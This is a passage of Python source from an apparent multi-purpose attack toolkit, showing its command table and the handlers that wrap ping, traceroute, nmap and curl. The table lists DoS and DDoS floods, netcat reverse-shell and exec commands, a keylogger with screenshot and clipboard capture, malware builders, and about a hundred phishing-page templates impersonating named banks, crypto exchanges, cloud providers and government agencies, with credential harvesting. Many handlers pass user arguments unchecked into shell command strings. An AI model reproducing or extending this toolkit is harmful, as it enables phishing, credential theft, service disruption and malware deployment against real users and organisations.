            'curl_upload': self._curl_upload,
            'curl_ftp': self._curl_ftp,
            
            # ==================== Wget Commands ====================
            'wget': self._wget,
            'wget_output': self._wget_output,
            'wget_continue': self._wget_continue,
            'wget_background': self._wget_background,
            'wget_quiet': self._wget_quiet,
            'wget_recursive': self._wget_recursive,
            'wget_mirror': self._wget_mirror,
            'wget_spider': self._wget_spider,
            'wget_input': self._wget_input,
            'wget_header': self._wget_header,
            'wget_user_agent': self._wget_user_agent,
            'wget_referer': self._wget_referer,
            'wget_cookies': self._wget_cookies,
            'wget_save_cookies': self._wget_save_cookies,
            'wget_limit_rate': self._wget_limit_rate,
            'wget_timeout': self._wget_timeout,
            'wget_tries': self._wget_tries,
            'wget_retry': self._wget_retry,
            'wget_no_check_cert': self._wget_no_check_cert,
            'wget_certificate': self._wget_certificate,
            'wget_private_key': self._wget_private_key,
            'wget_ca_certificate': self._wget_ca_certificate,
            'wget_proxy': self._wget_proxy,
            'wget_no_proxy': self._wget_no_proxy,
            'wget_user': self._wget_user,
            'wget_password': self._wget_password,
            'wget_post_data': self._wget_post_data,
            'wget_post_file': self._wget_post_file,
            'wget_method': self._wget_method,
            'wget_timestamping': self._wget_timestamping,
            'wget_no_clobber': self._wget_no_clobber,
            'wget_delete_after': self._wget_delete_after,
            'wget_progress': self._wget_progress,
            'wget_show_progress': self._wget_show_progress,
            'wget_config': self._wget_config,
            'wget_append_output': self._wget_append_output,
            'wget_output_file': self._wget_output_file,
            'wget_no_parent': self._wget_no_parent,
            'wget_cut_dirs': self._wget_cut_dirs,
            'wget_directory_prefix': self._wget_directory_prefix,
            'wget_convert_links': self._wget_convert_links,
            'wget_backup_converted': self._wget_backup_converted,
            'wget_adjust_extension': self._wget_adjust_extension,
            'wget_restrict_file_names': self._wget_restrict_file_names,
            'wget_trust_server_names': self._wget_trust_server_names,
            'wget_content_disposition': self._wget_content_disposition,
            'wget_random_wait': self._wget_random_wait,
            'wget_wait': self._wget_wait,
            'wget_waitretry': self._wget_waitretry,
            'wget_quota': self._wget_quota,
            'wget_dns_timeout': self._wget_dns_timeout,
            'wget_connect_timeout': self._wget_connect_timeout,
            'wget_read_timeout': self._wget_read_timeout,
            'wget_inet4': self._wget_inet4,
            'wget_inet6': self._wget_inet6,
            'wget_prefer_family': self._wget_prefer_family,
            'wget_bind_address': self._wget_bind_address,
            'wget_no_dns_cache': self._wget_no_dns_cache,
            'wget_no_http_keep_alive': self._wget_no_http_keep_alive,
            'wget_no_cache': self._wget_no_cache,
            'wget_no_cookies': self._wget_no_cookies,
            'wget_load_cookies': self._wget_load_cookies,
            'wget_keep_session_cookies': self._wget_keep_session_cookies,
            'wget_help': self._wget_help,
            'wget_version': self._wget_version,
            
            # ==================== Netcat Commands ====================
            'netcat': self._netcat,
            'nc': self._netcat,
            'nc_listen': self._nc_listen,
            'nc_scan': self._nc_scan,
            'nc_transfer': self._nc_transfer,
            'nc_shell': self._nc_shell,
            'nc_reverse': self._nc_reverse,
            'nc_banner': self._nc_banner,
            'nc_port_scan': self._nc_port_scan,
            'nc_udp': self._nc_udp,
            'nc_hex': self._nc_hex,
            'nc_verbose': self._nc_verbose,
            'nc_zero_io': self._nc_zero_io,
            'nc_exec': self._nc_exec,
            'nc_proxy': self._nc_proxy,
            'nc_ssl': self._nc_ssl,
            'nc_keep_open': self._nc_keep_open,
            'nc_source_port': self._nc_source_port,
            'nc_timeout': self._nc_timeout,
            'nc_wait': self._nc_wait,
            
            # ==================== SSH Commands ====================
            'ssh_add': self._ssh_add,
            'ssh_list': self._ssh_list,
            'ssh_connect': self._ssh_connect,
            'ssh_exec': self._ssh_exec,
            'ssh_disconnect': self._ssh_disconnect,
            
            # ==================== Traffic Generation ====================
            'traffic': self._traffic,
            'traffic_types': self._traffic_types,
            'traffic_stop': self._traffic_stop,
            'traffic_status': self._traffic_status,
            
            # ==================== DOS Attacks ====================
            'dos_syn': self._dos_syn,
            'dos_udp': self._dos_udp,
            'dos_http': self._dos_http,
            'dos_icmp': self._dos_icmp,
            'dos_stop': self._dos_stop,
            'dos_status': self._dos_status,
            'ddos_syn': self._dos_syn,
            'ddos_udp': self._dos_udp,
            'ddos_http': self._dos_http,
            'ddos_icmp': self._dos_icmp,
            
            # ==================== Spear Phishing ====================
            'spear_create': self._spear_create,
            'spear_send': self._spear_send,
            'spear_list': self._spear_list,
            
            # ==================== Keylogger ====================
            'keylogger_start': self._keylogger_start,
            'keylogger_stop': self._keylogger_stop,
            'keylogger_status': self._keylogger_status,
            'keylogger_logs': self._keylogger_logs,
            'keylogger_screenshots': self._keylogger_screenshots,
            'keylogger_clipboard': self._keylogger_clipboard,
            
            # ==================== Docker ====================
            'docker_scan': self._docker_scan,
            'docker_info': self._docker_info,
            'docker_ps': self._docker_ps,
            'docker_images': self._docker_images,
            'docker_bench': self._docker_bench,
            
            # ==================== Reverse Engineering ====================
            're_strings': self._re_strings,
            're_hexdump': self._re_hexdump,
            're_metadata': self._re_metadata,
            're_analyze': self._re_analyze,
            're_list': self._re_list,
            
            # ==================== Malware/Payload ====================
            'malware_keylogger': self._malware_keylogger,
            'malware_image': self._malware_image,
            'malware_pdf': self._malware_pdf,
            'malware_list': self._malware_list,
            
            # ==================== Social Engineering ====================
            'phish_facebook': lambda _: self._phish('facebook'),
            'phish_instagram': lambda _: self._phish('instagram'),
            'phish_twitter': lambda _: self._phish('twitter'),
            'phish_linkedin': lambda _: self._phish('linkedin'),
            'phish_gmail': lambda _: self._phish('gmail'),
            'phish_microsoft': lambda _: self._phish('microsoft'),
            'phish_google': lambda _: self._phish('google'),
            'phish_apple': lambda _: self._phish('apple'),
            'phish_paypal': lambda _: self._phish('paypal'),
            'phish_amazon': lambda _: self._phish('amazon'),
            'phish_netflix': lambda _: self._phish('netflix'),
            'phish_spotify': lambda _: self._phish('spotify'),
            'phish_whatsapp': lambda _: self._phish('whatsapp'),
            'phish_telegram': lambda _: self._phish('telegram'),
            'phish_discord': lambda _: self._phish('discord'),
            'phish_snapchat': lambda _: self._phish('snapchat'),
            'phish_tiktok': lambda _: self._phish('tiktok'),
            'phish_reddit': lambda _: self._phish('reddit'),
            'phish_github': lambda _: self._phish('github'),
            'phish_gitlab': lambda _: self._phish('gitlab'),
            'phish_protonmail': lambda _: self._phish('protonmail'),
            'phish_yahoo': lambda _: self._phish('yahoo'),
            'phish_slack': lambda _: self._phish('slack'),
            'phish_zoom': lambda _: self._phish('zoom'),
            'phish_teams': lambda _: self._phish('teams'),
            'phish_steam': lambda _: self._phish('steam'),
            'phish_roblox': lambda _: self._phish('roblox'),
            'phish_twitch': lambda _: self._phish('twitch'),
            'phish_epicgames': lambda _: self._phish('epicgames'),
            'phish_minecraft': lambda _: self._phish('minecraft'),
            'phish_xbox': lambda _: self._phish('xbox'),
            'phish_playstation': lambda _: self._phish('playstation'),
            'phish_cashapp': lambda _: self._phish('cashapp'),
            'phish_venmo': lambda _: self._phish('venmo'),
            'phish_chase': lambda _: self._phish('chase'),
            'phish_wellsfargo': lambda _: self._phish('wellsfargo'),
            'phish_bankofamerica': lambda _: self._phish('bankofamerica'),
            'phish_citibank': lambda _: self._phish('citibank'),
            'phish_capitalone': lambda _: self._phish('capitalone'),
            'phish_americanexpress': lambda _: self._phish('americanexpress'),
            'phish_discover': lambda _: self._phish('discover'),
            'phish_barclays': lambda _: self._phish('barclays'),
            'phish_hsbc': lambda _: self._phish('hsbc'),
            'phish_revolut': lambda _: self._phish('revolut'),
            'phish_monzo': lambda _: self._phish('monzo'),
            'phish_stripe': lambda _: self._phish('stripe'),
            'phish_square': lambda _: self._phish('square'),
            'phish_coinbase': lambda _: self._phish('coinbase'),
            'phish_binance': lambda _: self._phish('binance'),
            'phish_kraken': lambda _: self._phish('kraken'),
            'phish_metamask': lambda _: self._phish('metamask'),
            'phish_tinder': lambda _: self._phish('tinder'),
            'phish_bumble': lambda _: self._phish('bumble'),
            'phish_hinge': lambda _: self._phish('hinge'),
            'phish_okcupid': lambda _: self._phish('okcupid'),
            'phish_match': lambda _: self._phish('match'),
            'phish_grindr': lambda _: self._phish('grindr'),
            'phish_hulu': lambda _: self._phish('hulu'),
            'phish_disneyplus': lambda _: self._phish('disneyplus'),
            'phish_hbomax': lambda _: self._phish('hbomax'),
            'phish_primevideo': lambda _: self._phish('primevideo'),
            'phish_appletv': lambda _: self._phish('appletv'),
            'phish_paramount': lambda _: self._phish('paramount'),
            'phish_peacock': lambda _: self._phish('peacock'),
            'phish_crunchyroll': lambda _: self._phish('crunchyroll'),
            'phish_ebay': lambda _: self._phish('ebay'),
            'phish_walmart': lambda _: self._phish('walmart'),
            'phish_target': lambda _: self._phish('target'),
            'phish_bestbuy': lambda _: self._phish('bestbuy'),
            'phish_etsy': lambda _: self._phish('etsy'),
            'phish_aliexpress': lambda _: self._phish('aliexpress'),
            'phish_alibaba': lambda _: self._phish('alibaba'),
            'phish_wish': lambda _: self._phish('wish'),
            'phish_shein': lambda _: self._phish('shein'),
            'phish_temu': lambda _: self._phish('temu'),
            'phish_aws': lambda _: self._phish('aws'),
            'phish_azure': lambda _: self._phish('azure'),
            'phish_gcp': lambda _: self._phish('gcp'),
            'phish_digitalocean': lambda _: self._phish('digitalocean'),
            'phish_cloudflare': lambda _: self._phish('cloudflare'),
            'phish_namecheap': lambda _: self._phish('namecheap'),
            'phish_godaddy': lambda _: self._phish('godaddy'),
            'phish_heroku': lambda _: self._phish('heroku'),
            'phish_vercel': lambda _: self._phish('vercel'),
            'phish_netlify': lambda _: self._phish('netlify'),
            'phish_coursera': lambda _: self._phish('coursera'),
            'phish_udemy': lambda _: self._phish('udemy'),
            'phish_edx': lambda _: self._phish('edx'),
            'phish_khanacademy': lambda _: self._phish('khanacademy'),
            'phish_duolingo': lambda _: self._phish('duolingo'),
            'phish_irs': lambda _: self._phish('irs'),
            'phish_dmv': lambda _: self._phish('dmv'),
            'phish_usps': lambda _: self._phish('usps'),
            'phish_fedex': lambda _: self._phish('fedex'),
            'phish_ups': lambda _: self._phish('ups'),
            'phish_nordvpn': lambda _: self._phish('nordvpn'),
            'phish_expressvpn': lambda _: self._phish('expressvpn'),
            'phish_surfshark': lambda _: self._phish('surfshark'),
            'phish_lastpass': lambda _: self._phish('lastpass'),
            'phish_1password': lambda _: self._phish('1password'),
            'phish_custom': lambda _: self._phish('custom'),
            'phish_start': self._phish_start,
            'phish_stop': self._phish_stop,
            'phish_creds': self._phish_creds,
            'phish_list': self._phish_list,
            'phish_templates': self._phish_templates,
            
            # ==================== IP Management ====================
            'add_ip': self._add_ip,
            'remove_ip': self._remove_ip,
            'block_ip': self._block_ip,
            'unblock_ip': self._unblock_ip,
            'list_ips': self._list_ips,
            'ip_info': self._ip_info,
            'analyze_ip': self._analyze_ip,
            
            # ==================== Network Commands ====================
            'whois': self._whois,
            'dns': self._dns,
            'dig': self._dig,
            'nslookup': self._nslookup,
            'location': self._location,
            'scan': self._scan,
            'quick_scan': self._quick_scan,
            'full_scan': self._full_scan,
            'ip_to_domain': self._ip_to_domain,
            'domain_to_ip': self._domain_to_ip,
            
            # ==================== Chart Commands ====================
            'chart_bar': self._chart_bar,
            'chart_pie': self._chart_pie,
            'chart_stats': self._chart_stats,
            'chart_list': self._chart_list,
            
            # ==================== SaaS Commands ====================
            'saas_create_tenant': self._saas_create_tenant,
            'saas_list_tenants': self._saas_list_tenants,
            'saas_tenant_info': self._saas_tenant_info,
            
            # ==================== System Commands ====================
            'status': self._status,
            'history': self._history,
            'system': self._system,
            'threats': self._threats,
            'stats': self._stats,
            'clear': self._clear,
            'version': self._version,
            'help': self._help,
        }
        
        return commands
    
    def execute(self, command: str, source: str = "local", user_id: str = None) -> Dict:
        start_time = time.time()
        
        parts = command.strip().split()
        if not parts:
            return {'success': False, 'output': 'Empty command', 'execution_time': 0}
        
        cmd_name = parts[0].lower()
        args = parts[1:]
        
        if cmd_name in self.commands:
            try:
                result = self.commands[cmd_name](args)
            except Exception as e:
                result = {'success': False, 'output': f"Error: {e}", 'execution_time': 0}
        else:
            result = self._generic(command)
        
        execution_time = time.time() - start_time
        result['execution_time'] = execution_time
        
        self.db.log_command(command, source, source, user_id, result.get('success', False),
                           str(result.get('output', ''))[:5000], execution_time)
        
        return result
    
    # ==================== Ping Commands ====================
    def _ping(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: ping <target> [count]'}
        target = args[0]
        count = int(args[1]) if len(args) > 1 and args[1].isdigit() else 4
        result = self.tools.ping(target, count)
        return {'success': result.success, 'output': result.output}
    
    def _ping6(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: ping6 <target>'}
        return self._generic(f'ping6 -c 4 {args[0]}')
    
    def _ping_sweep(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: ping_sweep <network>'}
        return self._generic(f'nmap -sn {args[0]}')
    
    def _fping(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: fping <targets...>'}
        return self._generic(f'fping {" ".join(args)}')
    
    def _ping_flood(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: ping_flood <target>'}
        return self._generic(f'ping -f {args[0]}')
    
    def _ping_mtu(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: ping_mtu <target> <size>'}
        return self._generic(f'ping -M do -s {args[1]} {args[0]}')
    
    def _ping_size(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: ping_size <target> <size>'}
        return self._generic(f'ping -s {args[1]} {args[0]}')
    
    def _ping_count(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: ping_count <target> <count>'}
        return self._generic(f'ping -c {args[1]} {args[0]}')
    
    def _ping_interval(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: ping_interval <target> <interval>'}
        return self._generic(f'ping -i {args[1]} {args[0]}')
    
    def _ping_timeout(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: ping_timeout <target> <timeout>'}
        return self._generic(f'ping -W {args[1]} {args[0]}')
    
    def _ping_ttl(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: ping_ttl <target> <ttl>'}
        return self._generic(f'ping -t {args[1]} {args[0]}')
    
    def _ping_interface(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: ping_interface <target> <interface>'}
        return self._generic(f'ping -I {args[1]} {args[0]}')
    
    def _ping_source(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: ping_source <target> <source_ip>'}
        return self._generic(f'ping -S {args[1]} {args[0]}')
    
    def _ping_pattern(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: ping_pattern <target> <pattern>'}
        return self._generic(f'ping -p {args[1]} {args[0]}')
    
    def _ping_record(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: ping_record <target>'}
        return self._generic(f'ping -R {args[0]}')
    
    def _ping_timestamp(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: ping_timestamp <target>'}
        return self._generic(f'ping -D {args[0]}')
    
    def _ping_quiet(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: ping_quiet <target>'}
        return self._generic(f'ping -q -c 5 {args[0]}')
    
    def _ping_verbose(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: ping_verbose <target>'}
        return self._generic(f'ping -v {args[0]}')
    
    def _ping_deadline(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: ping_deadline <target> <seconds>'}
        return self._generic(f'ping -w {args[1]} {args[0]}')
    
    def _ping_numeric(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: ping_numeric <target>'}
        return self._generic(f'ping -n {args[0]}')
    
    def _ping_adaptive(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: ping_adaptive <target>'}
        return self._generic(f'ping -A {args[0]}')
    
    def _ping_audible(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: ping_audible <target>'}
        return self._generic(f'ping -a {args[0]}')
    
    def _ping_flood_icmp(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: ping_flood_icmp <target>'}
        return self._generic(f'hping3 --flood {args[0]}')
    
    # ==================== Traceroute Commands ====================
    def _traceroute(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: traceroute <target>'}
        result = self.tools.traceroute(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _traceroute6(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: traceroute6 <target>'}
        return self._generic(f'traceroute6 {args[0]}')
    
    def _traceroute_tcp(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: traceroute_tcp <target>'}
        return self._generic(f'traceroute -T {args[0]}')
    
    def _traceroute_udp(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: traceroute_udp <target>'}
        return self._generic(f'traceroute -U {args[0]}')
    
    def _traceroute_icmp(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: traceroute_icmp <target>'}
        return self._generic(f'traceroute -I {args[0]}')
    
    def _traceroute_max_hops(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: traceroute_max_hops <target> <hops>'}
        return self._generic(f'traceroute -m {args[1]} {args[0]}')
    
    def _traceroute_first_hop(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: traceroute_first_hop <target> <hop>'}
        return self._generic(f'traceroute -f {args[1]} {args[0]}')
    
    def _traceroute_queries(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: traceroute_queries <target> <queries>'}
        return self._generic(f'traceroute -q {args[1]} {args[0]}')
    
    def _traceroute_wait(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: traceroute_wait <target> <seconds>'}
        return self._generic(f'traceroute -w {args[1]} {args[0]}')
    
    def _traceroute_port(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: traceroute_port <target> <port>'}
        return self._generic(f'traceroute -p {args[1]} {args[0]}')
    
    def _traceroute_numeric(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: traceroute_numeric <target>'}
        return self._generic(f'traceroute -n {args[0]}')
    
    def _traceroute_verbose(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: traceroute_verbose <target>'}
        return self._generic(f'traceroute -v {args[0]}')
    
    def _mtr(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: mtr <target>'}
        return self._generic(f'mtr {args[0]}')
    
    def _mtr_report(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: mtr_report <target>'}
        return self._generic(f'mtr --report {args[0]}')
    
    def _mtr_json(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: mtr_json <target>'}
        return self._generic(f'mtr --json {args[0]}')
    
    def _mtr_csv(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: mtr_csv <target>'}
        return self._generic(f'mtr --csv {args[0]}')
    
    def _tcptraceroute(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: tcptraceroute <target>'}
        return self._generic(f'tcptraceroute {args[0]}')
    
    def _lft(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: lft <target>'}
        return self._generic(f'lft {args[0]}')
    
    def _tracepath(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: tracepath <target>'}
        return self._generic(f'tracepath {args[0]}')
    
    def _pathping(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: pathping <target>'}
        return self._generic(f'pathping {args[0]}')
    
    # ==================== Nmap Commands ====================
    def _nmap(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap <target> [options]'}
        result = self.tools.nmap(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _nmap_quick(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_quick <target>'}
        result = self.tools.nmap(args[0], 'quick')
        return {'success': result.success, 'output': result.output}
    
    def _nmap_full(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_full <target>'}
        result = self.tools.nmap(args[0], 'full')
        return {'success': result.success, 'output': result.output}
    
    def _nmap_os(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_os <target>'}
        result = self.tools.nmap(args[0], 'os')
        return {'success': result.success, 'output': result.output}
    
    def _nmap_service(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_service <target>'}
        result = self.tools.nmap(args[0], 'service')
        return {'success': result.success, 'output': result.output}
    
    def _nmap_udp(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_udp <target>'}
        result = self.tools.nmap(args[0], 'udp')
        return {'success': result.success, 'output': result.output}
    
    def _nmap_vuln(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_vuln <target>'}
        result = self.tools.nmap(args[0], 'vuln')
        return {'success': result.success, 'output': result.output}
    
    def _nmap_stealth(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_stealth <target>'}
        result = self.tools.nmap(args[0], 'stealth')
        return {'success': result.success, 'output': result.output}
    
    def _nmap_ping(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_ping <target>'}
        result = self.tools.nmap(args[0], 'ping')
        return {'success': result.success, 'output': result.output}
    
    def _nmap_ports(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nmap_ports <target> <ports>'}
        return self._generic(f'nmap -p {args[1]} {args[0]}')
    
    def _nmap_script(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nmap_script <target> <script>'}
        return self._generic(f'nmap --script {args[1]} {args[0]}')
    
    def _nmap_aggressive(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_aggressive <target>'}
        result = self.tools.nmap(args[0], 'aggressive')
        return {'success': result.success, 'output': result.output}
    
    def _nmap_traceroute(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_traceroute <target>'}
        return self._generic(f'nmap --traceroute {args[0]}')
    
    def _nmap_output(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nmap_output <target> <file>'}
        return self._generic(f'nmap -oN {args[1]} {args[0]}')
    
    def _nmap_exclude(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nmap_exclude <target> <exclude>'}
        return self._generic(f'nmap --exclude {args[1]} {args[0]}')
    
    def _nmap_exclude_file(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nmap_exclude_file <target> <file>'}
        return self._generic(f'nmap --excludefile {args[1]} {args[0]}')
    
    def _nmap_input(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_input <file>'}
        return self._generic(f'nmap -iL {args[0]}')
    
    def _nmap_random(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_random <count>'}
        return self._generic(f'nmap -iR {args[0]}')
    
    def _nmap_timing(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nmap_timing <target> <level>'}
        return self._generic(f'nmap -T{args[1]} {args[0]}')
    
    def _nmap_version(self, args: List[str]) -> Dict:
        return self._generic('nmap -V')
    
    def _nmap_help(self, args: List[str]) -> Dict:
        return self._generic('nmap --help')
    
    def _nmap_syn(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_syn <target>'}
        return self._generic(f'nmap -sS {args[0]}')
    
    def _nmap_connect(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_connect <target>'}
        return self._generic(f'nmap -sT {args[0]}')
    
    def _nmap_ack(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_ack <target>'}
        return self._generic(f'nmap -sA {args[0]}')
    
    def _nmap_fin(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_fin <target>'}
        return self._generic(f'nmap -sF {args[0]}')
    
    def _nmap_xmas(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_xmas <target>'}
        return self._generic(f'nmap -sX {args[0]}')
    
    def _nmap_null(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_null <target>'}
        return self._generic(f'nmap -sN {args[0]}')
    
    def _nmap_script_default(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_script_default <target>'}
        return self._generic(f'nmap -sC {args[0]}')
    
    def _nmap_top_ports(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nmap_top_ports <target> <count>'}
        return self._generic(f'nmap --top-ports {args[1]} {args[0]}')
    
    def _nmap_open(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_open <target>'}
        return self._generic(f'nmap --open {args[0]}')
    
    def _nmap_reason(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_reason <target>'}
        return self._generic(f'nmap --reason {args[0]}')
    
    def _nmap_packet_trace(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_packet_trace <target>'}
        return self._generic(f'nmap --packet-trace {args[0]}')
    
    def _nmap_iflist(self, args: List[str]) -> Dict:
        return self._generic('nmap --iflist')
    
    def _nmap_no_ping(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_no_ping <target>'}
        return self._generic(f'nmap -Pn {args[0]}')
    
    def _nmap_fast(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_fast <target>'}
        return self._generic(f'nmap -F {args[0]}')
    
    def _nmap_fragment(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_fragment <target>'}
        return self._generic(f'nmap -f {args[0]}')
    
    def _nmap_decoys(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nmap_decoys <target> <count>'}
        return self._generic(f'nmap -D RND:{args[1]} {args[0]}')
    
    def _nmap_source_port(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nmap_source_port <target> <port>'}
        return self._generic(f'nmap -g {args[1]} {args[0]}')
    
    def _nmap_data_length(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nmap_data_length <target> <length>'}
        return self._generic(f'nmap --data-length {args[1]} {args[0]}')
    
    def _nmap_ttl(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nmap_ttl <target> <ttl>'}
        return self._generic(f'nmap --ttl {args[1]} {args[0]}')
    
    def _nmap_spoof_mac(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nmap_spoof_mac <target> <mac>'}
        return self._generic(f'nmap --spoof-mac {args[1]} {args[0]}')
    
    def _nmap_badsum(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_badsum <target>'}
        return self._generic(f'nmap --badsum {args[0]}')
    
    def _nmap_send_eth(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_send_eth <target>'}
        return self._generic(f'nmap --send-eth {args[0]}')
    
    def _nmap_send_ip(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_send_ip <target>'}
        return self._generic(f'nmap --send-ip {args[0]}')
    
    # ==================== Curl Commands ====================
    def _curl(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl <url>'}
        result = self.tools.curl(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _curl_get(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_get <url>'}
        return self._generic(f'curl -s {args[0]}')
    
    def _curl_post(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_post <url> <data>'}
        return self._generic(f'curl -s -X POST -d "{args[1]}" {args[0]}')
    
    def _curl_put(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_put <url> <data>'}
        return self._generic(f'curl -s -X PUT -d "{args[1]}" {args[0]}')
    
    def _curl_delete(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_delete <url>'}
        return self._generic(f'curl -s -X DELETE {args[0]}')
    
    def _curl_patch(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_patch <url> <data>'}
        return self._generic(f'curl -s -X PATCH -d "{args[1]}" {args[0]}')
    
    def _curl_head(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_head <url>'}
        return self._generic(f'curl -s -I {args[0]}')
    
    def _curl_options(self, args: List[str]) -> Dict:
